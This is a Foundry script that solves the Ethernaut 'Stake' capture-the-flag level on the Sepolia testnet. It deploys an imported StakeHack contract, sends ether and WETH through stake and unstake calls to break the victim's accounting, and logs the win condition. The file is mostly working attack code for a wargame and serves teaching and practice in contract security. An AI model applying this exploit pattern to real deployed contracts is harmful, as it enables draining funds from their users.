// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.0 <=0.9.0;

import { console } from "@dev/forge-std/console.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { EthernautScript } from "./00_Ethernaut.s.sol";
import { Stake, StakeHack } from "contracts/CTF/Ethernaut/31_Stake.sol";
/*
forge script \
  foundry/script/CTF/Ethernaut/31_Stake.s.sol:StakeAttack \
  -f sepolia -vvvv \
  --broadcast
*/

contract StakeAttack is EthernautScript {
    Stake private victimInst;

    function run() public broadcast {
        // 1.Setup
        console.log("HigherOrder Before Attack player:", player);
        console.log("HigherOrder Before Attack player Balance:", player.balance);
        victimInst = Stake(0x34396E961Bd26257D4960687f6d27194c8da7744);

        // 2.Attack
        // ...
        StakeHack hackInst = new StakeHack();
        hackInst.attack{ value: 0.001 ether + 2 }(victimInst);
        ERC20 weth = ERC20(victimInst.WETH());
        weth.approve(address(victimInst), type(uint256).max);
        victimInst.StakeWETH(0.001 ether + 1);
        victimInst.Unstake(0.001 ether + 1);

        // 3Check
        // ...
        console.log("Check Balance", address(victimInst).balance, victimInst.totalStaked());
        console.log("Check UserStake", victimInst.UserStake(player));
        console.log("Check Stakers", victimInst.Stakers(player));
        console.log(
            "Check Result",
            address(victimInst).balance != 0 && victimInst.totalStaked() > address(victimInst).balance
                && victimInst.UserStake(player) == 0 && victimInst.Stakers(player)
        );
    }
}
